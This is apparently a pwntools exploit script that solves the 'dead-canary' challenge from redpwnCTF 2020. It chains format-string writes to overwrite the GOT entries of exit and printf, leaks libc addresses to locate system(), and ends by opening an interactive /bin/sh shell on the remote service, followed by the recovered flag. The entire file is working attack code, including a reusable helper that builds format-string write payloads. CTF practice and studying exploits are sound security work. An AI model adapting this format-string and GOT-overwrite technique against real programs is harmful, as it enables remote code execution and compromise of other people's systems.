from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./dead-canary')
	raw_input('debug')
	read_offset = 0x0f7250
	system_offset = 0x045390
else:
	host, port = '2020.redpwnc.tf', 31744
	r = remote(host, port)
	libc = ELF('./libc.so.6')
	read_offset = 	0x110070
	system_offset = 0x04f440
	

loop_add = 0x400737
exit_got = 0x601028

buf = '%55x%14$hhn' + '%208x%15$hhn' + '%57x%16$hhn' 
# buf += 'bbbb%15$s%16$s%43$p'
buf += 'bbbb%17$s%18$s%43$p'

buf = buf.ljust(64, 'a')
buf += p64(exit_got) + p64(exit_got + 1) + p64(exit_got + 2) + p64(0x601040) + p64(0x601028)
buf = buf.ljust(280, 'c')
buf += 'read'
r.sendlineafter('What is your name: ', buf)
log.info(buf)
r.recvuntil('bbbb')
res = r.recv(6)
read_add = u64(res + '\x00\x00')
log.info('read_add = %#x' %read_add)

res = r.recv(3)
printf_add = u64(res + '\x00'*5)
log.info('printf_add = %#x' %printf_add)

res = r.recv(14)
leak2 = int(res, 16) - 0x311
log.info('rsp2 = %#x ' %leak2)
r.recv(1)

libc_base = read_add - read_offset
system_add = libc_base + system_offset
log.info('system = %#x ' %system_add)

# ----------------------------------------------------

def exploitFS(hex, start, index, format):
	str1 = ""
	buf = ""
	for i in hex[::-1]:
		if i == 'x':
			break
		str1 += i
	if len(str1)%2 != 0:
		str1 += '0'
	l = int(len(str1) /2)
	for i in range(l):
		tmp = str1[i*2 +1] + str1[i*2]
		tmp2 = int(tmp, 16)
		if tmp2 < start:
			offset = tmp2 + 256  - start
			start = tmp2
		else:
			offset = tmp2 -start
			start = tmp2
		buf += '%' + str(offset) + 'x%' + str(index + i) + '$' + format
		
	return buf, start

buf2 = '/bin/sh;'
start = 8
tmp, start = exploitFS(hex(system_add), start, 20, 'hhn')
buf2 += tmp
tmp, start = exploitFS(hex(0xCD), start, 26, 'hhn')
buf2 += tmp
tmp, start = exploitFS('0x00', start, 27, 'n')
buf2 += tmp

buf2 = buf2.ljust(111, 'a')
buf2 += 'b' + p64(0x601038) + p64(0x601038 + 1) + p64(0x601038 + 2) + p64(0x601038 + 3) + p64(0x601038 + 4) + p64(0x601038 + 5)
buf2 += p64(exit_got)
buf2 += p64(leak2)
buf2 = buf2.ljust(285,'c')
r.sendlineafter('What is your name: ', buf2)
log.info(buf2)

r.interactive()
r.close()

# flag{t0_k1ll_a_canary_4e47da34}